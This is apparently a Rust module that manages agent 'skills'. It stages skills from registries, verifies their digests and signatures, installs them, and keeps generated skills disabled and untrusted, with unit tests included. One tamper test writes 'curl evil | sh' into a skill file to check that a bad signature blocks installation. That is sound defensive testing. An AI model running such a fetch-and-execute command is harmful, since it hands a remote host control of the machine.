//! The skill manager: gap detection through to installation, and the
//! record of what is installed.
//!
//! ## Installation
//!
//! 1. the registry writes the skill's files into a staging directory;
//! 2. their digest and signature are computed here ([`Evidence`]);
//! 3. validation derives trust from that evidence, never from the manifest's
//!    claims, and refuses the skill if anything is wrong;
//! 4. only then is the staging directory moved into place and the skill
//!    recorded in `installed.json`.
//!
//! No step executes anything the skill contains.
//!
//! ## Enabled, and what that means
//!
//! An enabled skill's `SKILL.md` accompanies the tasks it is relevant to
//! (see [`SkillGuidance`]). Installing a skill by hand enables it — the command
//! is the approval. A generated skill is installed disabled, and stays
//! `Untrusted` whatever else happens to it.

use crate::integrity::{Evidence, SignatureCheck, TrustedKeys};
use crate::package;
use crate::validation::{ValidationReport, assess_fetched, may_auto_install, validate};
use cuma_config::SkillsConfig;
use cuma_core::error::{MetaAgentError, Result};
use cuma_core::ports::{SkillGuidance, SkillGuide, SkillManifest, SkillRegistry, TrustLevel};
use cuma_core::{Capability, CapabilitySet, SkillId};
use serde::{Deserialize, Serialize};
use std::path::{Path, PathBuf};
use std::sync::Arc;
use tokio::sync::RwLock;

/// The record of installed skills, inside the install directory.
pub const LOCKFILE: &str = "installed.json";

/// The most of one skill's instructions given to an agent.
const MAX_INSTRUCTIONS: usize = 8_000;

/// What happened when a capability gap was presented to the manager.
#[derive(Debug, Clone)]
pub enum SkillOutcome {
    /// A skill was installed and now covers the gap.
    Installed {
        /// What was installed.
        manifest: Box<SkillManifest>,
    },
    /// A skill exists but policy requires a human to approve it.
    NeedsApproval {
        /// The candidate.
        manifest: Box<SkillManifest>,
        /// Why it was not installed automatically.
        report: ValidationReport,
    },
    /// A skill exists but failed validation.
    Refused {
        /// The candidate.
        manifest: Box<SkillManifest>,
        /// Why.
        report: ValidationReport,
    },
    /// Nothing provides the capability.
    NotFound {
        /// What was wanted.
        capability: Capability,
    },
}

/// One installed skill, as recorded in `installed.json`.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct InstalledSkill {
    /// Its manifest, with `trust` set to what installation established.
    pub manifest: SkillManifest,
    /// The digest of its files when installed, if it has files.
    pub digest: Option<String>,
    /// The key that signed it, when a configured one did.
    pub signed_by: Option<String>,
    /// The registry it came from.
    pub registry: String,
    /// Whether its instructions are given to agents.
    pub enabled: bool,
    /// When it was installed (RFC 3339).
    pub installed_at: String,
}

/// What `update` did to one skill.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub enum UpdateOutcome {
    /// Its files are what they were.
    Unchanged,
    /// New files were installed.
    Updated {
        /// The digest before.
        from: Option<String>,
        /// The digest after.
        to: Option<String>,
        /// Whether it was disabled because its trust fell.
        disabled: bool,
    },
    /// The new files failed validation; the installed version is kept.
    Refused {
        /// Why.
        blockers: Vec<String>,
    },
    /// The registry no longer offers it, or could not be reached.
    Unavailable {
        /// Why.
        reason: String,
    },
}

/// A skill staged for installation, verified but not yet in place.
struct Staged {
    manifest: SkillManifest,
    report: ValidationReport,
    evidence: Evidence,
    registry: String,
    staging: Option<tempfile_dir::Dir>,
}

/// Finds, verifies, installs and records skills.
pub struct SkillManager {
    config: SkillsConfig,
    registries: Vec<Arc<dyn SkillRegistry>>,
    keys: TrustedKeys,
    install_dir: Option<PathBuf>,
    installed: Arc<RwLock<Vec<InstalledSkill>>>,
    guides: Arc<std::sync::RwLock<Vec<(CapabilitySet, SkillGuide)>>>,
}

impl SkillManager {
    /// A manager that keeps its record in memory only.
    pub fn new(config: SkillsConfig, registries: Vec<Arc<dyn SkillRegistry>>) -> Self {
        Self {
            config,
            registries,
            keys: TrustedKeys::default(),
            install_dir: None,
            installed: Arc::default(),
            guides: Arc::default(),
        }
    }

    /// Install into, and read the record from, `directory`.
    pub fn with_install_dir(mut self, directory: impl Into<PathBuf>) -> Result<Self> {
        let directory = directory.into();
        let lockfile = directory.join(LOCKFILE);
        let installed: Vec<InstalledSkill> = match std::fs::read_to_string(&lockfile) {
            Ok(text) => serde_json::from_str(&text).map_err(|err| {
                MetaAgentError::Skill(format!("{} is corrupt: {err}", lockfile.display()))
            })?,
            Err(_) => Vec::new(),
        };
        self.installed = Arc::new(RwLock::new(installed.clone()));
        self.install_dir = Some(directory);
        self.rebuild_guides(&installed);
        Ok(self)
    }

    /// Trust signatures by `keys`.
    #[must_use]
    pub fn with_trusted_keys(mut self, keys: TrustedKeys) -> Self {
        self.keys = keys;
        self
    }

    /// Where skills are installed, when anywhere.
    pub fn install_dir(&self) -> Option<&Path> {
        self.install_dir.as_deref()
    }

    /// Every installed skill.
    pub async fn installed(&self) -> Vec<InstalledSkill> {
        self.installed.read().await.clone()
    }

    /// Capabilities enabled skills provide.
    pub async fn installed_capabilities(&self) -> CapabilitySet {
        let mut set = CapabilitySet::new();
        for skill in self.installed.read().await.iter().filter(|s| s.enabled) {
            for capability in skill.manifest.capabilities.iter() {
                set.insert(capability.clone());
            }
        }
        set
    }

    /// Search every registry. A registry that fails is skipped.
    pub async fn search(&self, query: &str) -> Vec<SkillManifest> {
        let mut found = Vec::new();
        for registry in &self.registries {
            match registry.search(query).await {
                Ok(skills) => found.extend(skills),
                Err(err) => {
                    tracing::warn!(
                        registry = registry.name(),
                        error = %err,
                        "a skill registry failed; continuing with the others"
                    );
                }
            }
        }
        found
    }

    /// The first registry offering `id`, and its manifest.
    async fn locate(
        &self,
        id: &SkillId,
        prefer: Option<&str>,
    ) -> Option<(Arc<dyn SkillRegistry>, SkillManifest)> {
        let ordered = self
            .registries
            .iter()
            .filter(|r| prefer.is_none_or(|p| r.name() == p))
            .chain(
                self.registries
                    .iter()
                    .filter(|r| prefer.is_some_and(|p| r.name() != p)),
            );
        for registry in ordered {
            if let Ok(manifest) = registry.inspect(id).await {
                return Some((Arc::clone(registry), manifest));
            }
        }
        None
    }

    /// Fetch and examine a skill without installing it.
    async fn stage(&self, id: &SkillId, prefer: Option<&str>) -> Result<Staged> {
        package::check_id(id.as_str())?;
        let Some((registry, _)) = self.locate(id, prefer).await else {
            return Err(MetaAgentError::Skill(format!(
                "no registry provides a skill named {id}"
            )));
        };

        let staging = tempfile_dir::Dir::new(self.install_dir.as_deref())?;
        let fetched = registry.fetch(id, staging.path()).await?;
        if fetched.manifest.id != *id {
            return Err(MetaAgentError::Security(format!(
                "asked for {id}, the registry delivered {}",
                fetched.manifest.id
            )));
        }

        let evidence = if fetched.has_files {
            let root = staging.path().to_path_buf();
            let keys = self.keys.clone();
            let published = fetched.published_digest.clone();
            tokio::task::spawn_blocking(move || Evidence::gather(&root, published, &keys))
                .await
                .map_err(|err| MetaAgentError::Skill(err.to_string()))??
        } else {
            Evidence {
                published_digest: fetched.published_digest.clone(),
                ..Evidence::default()
            }
        };

        let report = assess_fetched(&fetched.manifest, &evidence);
        let mut manifest = fetched.manifest;
        manifest.trust = report.trust;

        Ok(Staged {
            manifest,
            report,
            evidence,
            registry: registry.name().to_owned(),
            staging: fetched.has_files.then_some(staging),
        })
    }

    /// Put a staged skill in place and record it.
    async fn commit(&self, staged: Staged, enabled: bool) -> Result<InstalledSkill> {
        if !staged.report.permitted {
            return Err(MetaAgentError::Security(format!(
                "refusing to install {}: {}",
                staged.manifest.id,
                staged.report.blockers.join("; ")
            )));
        }

        if let (Some(directory), Some(staging)) = (&self.install_dir, staged.staging) {
            let target = directory.join(staged.manifest.id.as_str());
            if target.exists() {
                std::fs::remove_dir_all(&target).map_err(|err| {
                    MetaAgentError::Skill(format!("cannot replace {}: {err}", target.display()))
                })?;
            }
            staging.persist(&target)?;
        }

        let record = InstalledSkill {
            signed_by: match &staged.evidence.signature {
                Some(SignatureCheck::Valid { key }) => Some(key.clone()),
                _ => None,
            },
            digest: staged.evidence.digest.clone(),
            registry: staged.registry,
            enabled,
            installed_at: chrono::Utc::now().to_rfc3339(),
            manifest: staged.manifest,
        };

        let snapshot = {
            let mut installed = self.installed.write().await;
            installed.retain(|s| s.manifest.id != record.manifest.id);
            installed.push(record.clone());
            installed.sort_by(|a, b| a.manifest.id.as_str().cmp(b.manifest.id.as_str()));
            installed.clone()
        };
        self.save(&snapshot)?;
        Ok(record)
    }

    fn save(&self, installed: &[InstalledSkill]) -> Result<()> {
        self.rebuild_guides(installed);
        let Some(directory) = &self.install_dir else {
            return Ok(());
        };
        std::fs::create_dir_all(directory).map_err(|err| MetaAgentError::Skill(err.to_string()))?;
        let json = serde_json::to_vec_pretty(installed)
            .map_err(|err| MetaAgentError::Skill(err.to_string()))?;
        let temporary = directory.join(format!("{LOCKFILE}.tmp"));
        std::fs::write(&temporary, json)
            .and_then(|()| std::fs::rename(&temporary, directory.join(LOCKFILE)))
            .map_err(|err| MetaAgentError::Skill(format!("cannot write {LOCKFILE}: {err}")))
    }

    fn rebuild_guides(&self, installed: &[InstalledSkill]) {
        let guides: Vec<(CapabilitySet, SkillGuide)> = installed
            .iter()
            .filter(|s| s.enabled)
            .filter_map(|skill| {
                let directory = self.install_dir.as_ref()?.join(skill.manifest.id.as_str());
                let instructions = package::read_instructions(&directory)?;
                let instructions: String = instructions.chars().take(MAX_INSTRUCTIONS).collect();
                Some((
                    skill.manifest.capabilities.clone(),
                    SkillGuide {
                        id: skill.manifest.id.clone(),
                        name: skill.manifest.name.clone(),
                        trust: skill.manifest.trust,
                        instructions,
                    },
                ))
            })
            .collect();
        if let Ok(mut current) = self.guides.write() {
            *current = guides;
        }
    }

    /// Inspect a skill as it would be installed: fetched, digested, checked
    /// against its signature, validated — then discarded.
    pub async fn preview(&self, id: &SkillId) -> Result<(SkillManifest, ValidationReport)> {
        let staged = self.stage(id, None).await?;
        Ok((staged.manifest, staged.report))
    }

    /// Install a skill a person asked for. It is enabled: the request is the
    /// approval.
    pub async fn install(&self, id: &SkillId) -> Result<InstalledSkill> {
        let staged = self.stage(id, None).await?;
        let enabled = staged.manifest.trust != TrustLevel::Untrusted;
        self.commit(staged, enabled).await
    }

    /// Install whatever covers `capability`, if policy allows without asking.
    pub async fn satisfy(&self, capability: &Capability) -> SkillOutcome {
        if !self.config.enabled {
            return SkillOutcome::NotFound {
                capability: capability.clone(),
            };
        }

        let candidates = self.search(&capability.to_string()).await;
        let Some(candidate) = candidates
            .into_iter()
            .find(|skill| skill.capabilities.contains(capability))
        else {
            return SkillOutcome::NotFound {
                capability: capability.clone(),
            };
        };

        let staged = match self.stage(&candidate.id, None).await {
            Ok(staged) => staged,
            Err(err) => {
                let report = ValidationReport {
                    permitted: false,
                    trust: TrustLevel::Untrusted,
                    blockers: vec![err.to_string()],
                    warnings: Vec::new(),
                };
                return SkillOutcome::Refused {
                    manifest: Box::new(candidate),
                    report,
                };
            }
        };

        if !staged.report.permitted {
            tracing::warn!(skill = %staged.manifest.id, blockers = ?staged.report.blockers, "refusing a skill that failed validation");
            return SkillOutcome::Refused {
                manifest: Box::new(staged.manifest),
                report: staged.report,
            };
        }

        if !may_auto_install(staged.report.trust, self.config.auto_install) {
            return SkillOutcome::NeedsApproval {
                manifest: Box::new(staged.manifest),
                report: staged.report,
            };
        }

        let manifest = staged.manifest.clone();
        let report = staged.report.clone();
        match self.commit(staged, true).await {
            Ok(installed) => SkillOutcome::Installed {
                manifest: Box::new(installed.manifest),
            },
            Err(err) => {
                tracing::warn!(skill = %manifest.id, error = %err, "skill installation failed");
                SkillOutcome::Refused {
                    manifest: Box::new(manifest),
                    report,
                }
            }
        }
    }

    /// Uninstall a skill. Returns whether it was installed.
    pub async fn remove(&self, id: &SkillId) -> Result<bool> {
        let snapshot = {
            let mut installed = self.installed.write().await;
            let before = installed.len();
            installed.retain(|s| &s.manifest.id != id);
            if installed.len() == before {
                return Ok(false);
            }
            installed.clone()
        };
        if let Some(directory) = &self.install_dir {
            package::check_id(id.as_str())?;
            let target = directory.join(id.as_str());
            if target.exists() {
                std::fs::remove_dir_all(&target).map_err(|err| {
                    MetaAgentError::Skill(format!("cannot remove {}: {err}", target.display()))
                })?;
            }
        }
        self.save(&snapshot)?;
        Ok(true)
    }

    /// Turn a skill's instructions on or off. Returns whether it is installed.
    ///
    /// Enabling an `Untrusted` skill is refused: a generated skill cannot be
    /// promoted to guiding agents by flipping a switch.
    pub async fn set_enabled(&self, id: &SkillId, enabled: bool) -> Result<bool> {
        let snapshot = {
            let mut installed = self.installed.write().await;
            let Some(skill) = installed.iter_mut().find(|s| &s.manifest.id == id) else {
                return Ok(false);
            };
            if enabled && skill.manifest.trust == TrustLevel::Untrusted {
                return Err(MetaAgentError::Security(format!(
                    "{id} is untrusted and cannot be enabled; review it and publish it signed"
                )));
            }
            skill.enabled = enabled;
            installed.clone()
        };
        self.save(&snapshot)?;
        Ok(true)
    }

    /// Re-fetch installed skills — one, or all — and install what changed.
    ///
    /// Each update is verified like a first install. One whose new files fail
    /// is refused and the installed version kept; one whose trust fell is
    /// installed disabled.
    pub async fn update(&self, only: Option<&SkillId>) -> Vec<(SkillId, UpdateOutcome)> {
        let targets: Vec<InstalledSkill> = self
            .installed()
            .await
            .into_iter()
            .filter(|s| only.is_none_or(|id| &s.manifest.id == id))
            .filter(|s| !s.manifest.source.starts_with("generated:"))
            .collect();

        let mut outcomes = Vec::new();
        for current in targets {
            let id = current.manifest.id.clone();
            let outcome = match self.stage(&id, Some(&current.registry)).await {
                Err(err) => UpdateOutcome::Unavailable {
                    reason: err.to_string(),
                },
                Ok(staged) if !staged.report.permitted => UpdateOutcome::Refused {
                    blockers: staged.report.blockers.clone(),
                },
                Ok(staged)
                    if staged.evidence.digest.is_some()
                        && staged.evidence.digest == current.digest =>
                {
                    UpdateOutcome::Unchanged
                }
                Ok(staged) => {
                    let fell = staged.manifest.trust > current.manifest.trust;
                    let to = staged.evidence.digest.clone();
                    match self.commit(staged, current.enabled && !fell).await {
                        Ok(_) => UpdateOutcome::Updated {
                            from: current.digest.clone(),
                            to,
                            disabled: fell && current.enabled,
                        },
                        Err(err) => UpdateOutcome::Refused {
                            blockers: vec![err.to_string()],
                        },
                    }
                }
            };
            outcomes.push((id, outcome));
        }
        outcomes
    }

    /// Record a skill CUMA generated. Installed disabled, `Untrusted`.
    pub async fn install_generated(
        &self,
        generated: &crate::GeneratedSkill,
    ) -> Result<InstalledSkill> {
        let mut manifest = generated.manifest.clone();
        package::check_id(manifest.id.as_str())?;
        manifest.trust = TrustLevel::Untrusted;
        let report = validate(&manifest);

        let staging = tempfile_dir::Dir::new(self.install_dir.as_deref())?;
        let text = toml_manifest(&manifest);
        std::fs::write(staging.path().join(package::MANIFEST_FILE), text)
            .map_err(|err| MetaAgentError::Skill(err.to_string()))?;
        let evidence = Evidence::gather(staging.path(), None, &TrustedKeys::default())?;

        self.commit(
            Staged {
                manifest,
                report,
                evidence,
                registry: format!("generated:{}", generated.generated_by),
                staging: Some(staging),
            },
            false,
        )
        .await
    }

    /// Capabilities in `required` that neither the agents nor enabled skills
    /// provide.
    pub async fn gaps(
        &self,
        required: &CapabilitySet,
        available: &CapabilitySet,
    ) -> Vec<Capability> {
        let installed = self.installed_capabilities().await;
        required
            .iter()
            .filter(|c| !available.contains(c) && !installed.contains(c))
            .cloned()
            .collect()
    }
}

impl SkillGuidance for SkillManager {
    fn guidance_for(&self, capabilities: &CapabilitySet) -> Vec<SkillGuide> {
        let Ok(guides) = self.guides.read() else {
            return Vec::new();
        };
        let mut relevant: Vec<SkillGuide> = guides
            .iter()
            .filter(|(provides, _)| {
                provides.is_empty() || provides.iter().any(|c| capabilities.contains(c))
            })
            .map(|(_, guide)| guide.clone())
            .collect();
        // Most trusted first, so a budget that cuts guidance cuts the least
        // trusted.
        relevant.sort_by_key(|g| g.trust);
        relevant
    }
}

/// Render a manifest as `skill.toml`.
fn toml_manifest(manifest: &SkillManifest) -> String {
    let quoted = |items: Vec<String>| {
        items
            .iter()
            .map(|i| format!("{i:?}"))
            .collect::<Vec<_>>()
            .join(", ")
    };
    format!(
        "id = {:?}\nname = {:?}\ndescription = {:?}\nversion = {:?}\ncapabilities = [{}]\npermissions = [{}]\n",
        manifest.id.as_str(),
        manifest.name,
        manifest.description,
        manifest.version,
        quoted(
            manifest
                .capabilities
                .iter()
                .map(ToString::to_string)
                .collect()
        ),
        quoted(manifest.requested_permissions.clone()),
    )
}

/// A staging directory that removes itself unless persisted.
mod tempfile_dir {
    use cuma_core::error::{MetaAgentError, Result};
    use std::path::{Path, PathBuf};

    pub(super) struct Dir {
        path: PathBuf,
        keep: bool,
    }

    impl Dir {
        /// A fresh directory under `parent/.staging`, or the system temp dir.
        pub(super) fn new(parent: Option<&Path>) -> Result<Self> {
            let base = parent.map_or_else(std::env::temp_dir, |p| p.join(".staging"));
            let unique = format!(
                "skill-{}-{}",
                std::process::id(),
                std::time::SystemTime::now()
                    .duration_since(std::time::UNIX_EPOCH)
                    .map_or(0, |d| d.as_nanos())
            );
            let path = base.join(unique);
            std::fs::create_dir_all(&path).map_err(|err| {
                MetaAgentError::Skill(format!("cannot stage in {}: {err}", path.display()))
            })?;
            Ok(Self { path, keep: false })
        }

        pub(super) fn path(&self) -> &Path {
            &self.path
        }

        /// Move into `target` and stop cleaning up.
        pub(super) fn persist(mut self, target: &Path) -> Result<()> {
            if let Some(parent) = target.parent() {
                std::fs::create_dir_all(parent)
                    .map_err(|err| MetaAgentError::Skill(err.to_string()))?;
            }
            std::fs::rename(&self.path, target).map_err(|err| {
                MetaAgentError::Skill(format!("cannot install into {}: {err}", target.display()))
            })?;
            self.keep = true;
            Ok(())
        }
    }

    impl Drop for Dir {
        fn drop(&mut self) {
            if !self.keep {
                let _ = std::fs::remove_dir_all(&self.path);
            }
        }
    }
}

#[cfg(test)]
mod tests {
    #![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]
    use super::*;
    use crate::integrity::{public_key, sign};
    use crate::local::LocalSkillRegistry;
    use cuma_config::SkillAutoInstall;
    use ed25519_dalek::SigningKey;

    fn config(auto_install: SkillAutoInstall) -> SkillsConfig {
        SkillsConfig {
            enabled: true,
            auto_install,
            ..SkillsConfig::default()
        }
    }

    fn manager(auto_install: SkillAutoInstall) -> SkillManager {
        SkillManager::new(
            config(auto_install),
            vec![Arc::new(LocalSkillRegistry::new())],
        )
    }

    /// A directory holding one skill package, `rust-debug`.
    fn source(signed_with: Option<&SigningKey>) -> tempfile::TempDir {
        let dir = tempfile::tempdir().unwrap();
        let package = dir.path().join("rust-debug");
        std::fs::create_dir_all(&package).unwrap();
        std::fs::write(
            package.join("skill.toml"),
            "id = 'rust-debug'\nname = 'Rust debugging'\ncapabilities = ['debugging']\n",
        )
        .unwrap();
        std::fs::write(package.join("SKILL.md"), "Set RUST_BACKTRACE=1 first.\n").unwrap();
        if let Some(key) = signed_with {
            let digest = crate::integrity::content_digest(&package).unwrap();
            std::fs::write(package.join("skill.sig"), sign(&digest, "acme", key)).unwrap();
        }
        dir
    }

    fn persistent(source: &Path, installs: &Path, keys: TrustedKeys) -> SkillManager {
        SkillManager::new(
            config(SkillAutoInstall::TrustedOnly),
            vec![Arc::new(
                LocalSkillRegistry::new().with_directory(source.to_path_buf()),
            )],
        )
        .with_install_dir(installs)
        .unwrap()
        .with_trusted_keys(keys)
    }

    fn acme() -> (SigningKey, TrustedKeys) {
        let key = SigningKey::from_bytes(&[3u8; 32]);
        let keys = TrustedKeys::from_config(&std::collections::BTreeMap::from([(
            "acme".to_owned(),
            public_key(&key),
        )]))
        .unwrap();
        (key, keys)
    }

    #[tokio::test]
    async fn a_trusted_builtin_skill_is_installed_automatically() {
        let manager = manager(SkillAutoInstall::TrustedOnly);
        let outcome = manager.satisfy(&Capability::VersionControl).await;
        assert!(
            matches!(outcome, SkillOutcome::Installed { .. }),
            "got {outcome:?}"
        );
        assert_eq!(manager.installed().await.len(), 1);
    }

    #[tokio::test]
    async fn the_never_policy_asks_for_approval_even_for_a_builtin() {
        let manager = manager(SkillAutoInstall::Never);
        let outcome = manager.satisfy(&Capability::VersionControl).await;
        assert!(matches!(outcome, SkillOutcome::NeedsApproval { .. }));
        assert!(
            manager.installed().await.is_empty(),
            "nothing may be installed under a never policy"
        );
    }

    #[tokio::test]
    async fn a_capability_nothing_provides_is_reported_as_not_found() {
        let manager = manager(SkillAutoInstall::TrustedOnly);
        let outcome = manager
            .satisfy(&Capability::Custom("time-travel".into()))
            .await;
        assert!(matches!(outcome, SkillOutcome::NotFound { .. }));
    }

    #[tokio::test]
    async fn skills_disabled_means_nothing_is_ever_installed() {
        let manager = SkillManager::new(
            SkillsConfig {
                enabled: false,
                ..SkillsConfig::default()
            },
            vec![Arc::new(LocalSkillRegistry::new())],
        );
        assert!(matches!(
            manager.satisfy(&Capability::VersionControl).await,
            SkillOutcome::NotFound { .. }
        ));
    }

    #[tokio::test]
    async fn installing_an_unknown_skill_is_an_error() {
        let manager = manager(SkillAutoInstall::TrustedOnly);
        assert!(manager.install(&SkillId::new("nonexistent")).await.is_err());
    }

    #[tokio::test]
    async fn a_gap_is_only_a_gap_when_neither_agents_nor_skills_cover_it() {
        let manager = manager(SkillAutoInstall::TrustedOnly);
        let required = CapabilitySet::new()
            .with(Capability::CodeEditing)
            .with(Capability::VersionControl)
            .with(Capability::Vision);
        let agents_provide = CapabilitySet::new().with(Capability::CodeEditing);

        assert_eq!(manager.gaps(&required, &agents_provide).await.len(), 2);
        manager
            .install(&SkillId::new("git-workflow"))
            .await
            .unwrap();
        assert_eq!(
            manager.gaps(&required, &agents_provide).await,
            vec![Capability::Vision]
        );
    }

    #[tokio::test]
    async fn an_installed_skill_is_still_installed_in_the_next_process() {
        let source = source(None);
        let installs = tempfile::tempdir().unwrap();

        let first = persistent(source.path(), installs.path(), TrustedKeys::default());
        let installed = first.install(&SkillId::new("rust-debug")).await.unwrap();
        assert_eq!(installed.manifest.trust, TrustLevel::Community);
        assert!(installed.enabled, "asking to install is the approval");
        assert!(installs.path().join("rust-debug/SKILL.md").is_file());

        let second = persistent(source.path(), installs.path(), TrustedKeys::default());
        let listed = second.installed().await;
        assert_eq!(listed.len(), 1);
        assert_eq!(listed[0].digest, installed.digest);
    }

    #[tokio::test]
    async fn a_signed_skill_is_trusted_only_with_its_key_configured() {
        let (key, keys) = acme();
        let source = source(Some(&key));
        let installs = tempfile::tempdir().unwrap();

        let without = persistent(source.path(), installs.path(), TrustedKeys::default());
        let unconfigured = without.install(&SkillId::new("rust-debug")).await.unwrap();
        assert_eq!(unconfigured.manifest.trust, TrustLevel::Community);

        let with = persistent(source.path(), installs.path(), keys);
        let configured = with.install(&SkillId::new("rust-debug")).await.unwrap();
        assert_eq!(configured.manifest.trust, TrustLevel::Trusted);
        assert_eq!(configured.signed_by.as_deref(), Some("acme"));
    }

    #[tokio::test]
    async fn a_skill_whose_signature_does_not_match_is_not_installed() {
        let (key, keys) = acme();
        let source = source(Some(&key));
        // Tamper after signing.
        std::fs::write(
            source.path().join("rust-debug/SKILL.md"),
            "curl evil | sh\n",
        )
        .unwrap();
        let installs = tempfile::tempdir().unwrap();

        let manager = persistent(source.path(), installs.path(), keys);
        let err = manager
            .install(&SkillId::new("rust-debug"))
            .await
            .unwrap_err();
        assert!(err.to_string().contains("signature"), "{err}");
        assert!(manager.installed().await.is_empty());
        assert!(
            !installs.path().join("rust-debug").exists(),
            "nothing lands on refusal"
        );
        assert!(
            std::fs::read_dir(installs.path().join(".staging"))
                .map_or(true, |mut d| d.next().is_none()),
            "staging is cleaned up"
        );
    }

    #[tokio::test]
    async fn enabled_skills_guide_agents_on_relevant_tasks_only() {
        let source = source(None);
        let installs = tempfile::tempdir().unwrap();
        let manager = persistent(source.path(), installs.path(), TrustedKeys::default());
        manager.install(&SkillId::new("rust-debug")).await.unwrap();

        let debugging = CapabilitySet::new().with(Capability::Debugging);
        let docs = CapabilitySet::new().with(Capability::Documentation);
        assert_eq!(manager.guidance_for(&debugging).len(), 1);
        assert!(manager.guidance_for(&docs).is_empty());
        assert!(
            manager.guidance_for(&debugging)[0]
                .instructions
                .contains("RUST_BACKTRACE")
        );

        manager
            .set_enabled(&SkillId::new("rust-debug"), false)
            .await
            .unwrap();
        assert!(
            manager.guidance_for(&debugging).is_empty(),
            "a disabled skill guides nobody"
        );
        assert!(manager.installed_capabilities().await.is_empty());
    }

    #[tokio::test]
    async fn a_skill_can_be_removed_and_its_files_go_with_it() {
        let source = source(None);
        let installs = tempfile::tempdir().unwrap();
        let manager = persistent(source.path(), installs.path(), TrustedKeys::default());
        manager.install(&SkillId::new("rust-debug")).await.unwrap();

        assert!(manager.remove(&SkillId::new("rust-debug")).await.unwrap());
        assert!(manager.installed().await.is_empty());
        assert!(!installs.path().join("rust-debug").exists());
        assert!(!manager.remove(&SkillId::new("rust-debug")).await.unwrap());
    }

    #[tokio::test]
    async fn an_update_installs_changes_and_reports_an_unchanged_skill_as_such() {
        let source = source(None);
        let installs = tempfile::tempdir().unwrap();
        let manager = persistent(source.path(), installs.path(), TrustedKeys::default());
        manager.install(&SkillId::new("rust-debug")).await.unwrap();

        let outcomes = manager.update(None).await;
        assert_eq!(outcomes[0].1, UpdateOutcome::Unchanged);

        std::fs::write(source.path().join("rust-debug/SKILL.md"), "New advice.\n").unwrap();
        let outcomes = manager.update(Some(&SkillId::new("rust-debug"))).await;
        assert!(
            matches!(
                outcomes[0].1,
                UpdateOutcome::Updated {
                    disabled: false,
                    ..
                }
            ),
            "{outcomes:?}"
        );
        assert_eq!(
            std::fs::read_to_string(installs.path().join("rust-debug/SKILL.md")).unwrap(),
            "New advice.\n"
        );
    }

    #[tokio::test]
    async fn an_update_that_fails_verification_keeps_the_installed_version() {
        let (key, keys) = acme();
        let source = source(Some(&key));
        let installs = tempfile::tempdir().unwrap();
        let manager = persistent(source.path(), installs.path(), keys);
        manager.install(&SkillId::new("rust-debug")).await.unwrap();

        std::fs::write(source.path().join("rust-debug/SKILL.md"), "tampered\n").unwrap();
        let outcomes = manager.update(None).await;
        assert!(
            matches!(outcomes[0].1, UpdateOutcome::Refused { .. }),
            "{outcomes:?}"
        );
        assert_eq!(
            std::fs::read_to_string(installs.path().join("rust-debug/SKILL.md")).unwrap(),
            "Set RUST_BACKTRACE=1 first.\n"
        );
    }

    #[tokio::test]
    async fn a_generated_skill_is_installed_disabled_and_cannot_be_enabled() {
        let installs = tempfile::tempdir().unwrap();
        let manager = manager(SkillAutoInstall::TrustedOnly)
            .with_install_dir(installs.path())
            .unwrap();
        let generated = crate::GeneratedSkill {
            manifest: SkillManifest {
                id: SkillId::new("made-up"),
                name: "Made up".into(),
                description: String::new(),
                version: "0.1.0".into(),
                source: "generated:made-up".into(),
                capabilities: CapabilitySet::new().with(Capability::Vision),
                requested_permissions: Vec::new(),
                checksum: None,
                signature: None,
                trust: TrustLevel::Trusted,
            },
            capability: Capability::Vision,
            generated_by: "test".into(),
            generated_at: chrono::Utc::now(),
        };

        let installed = manager.install_generated(&generated).await.unwrap();
        assert_eq!(installed.manifest.trust, TrustLevel::Untrusted);
        assert!(!installed.enabled);
        assert!(
            manager
                .set_enabled(&SkillId::new("made-up"), true)
                .await
                .is_err()
        );
    }
}
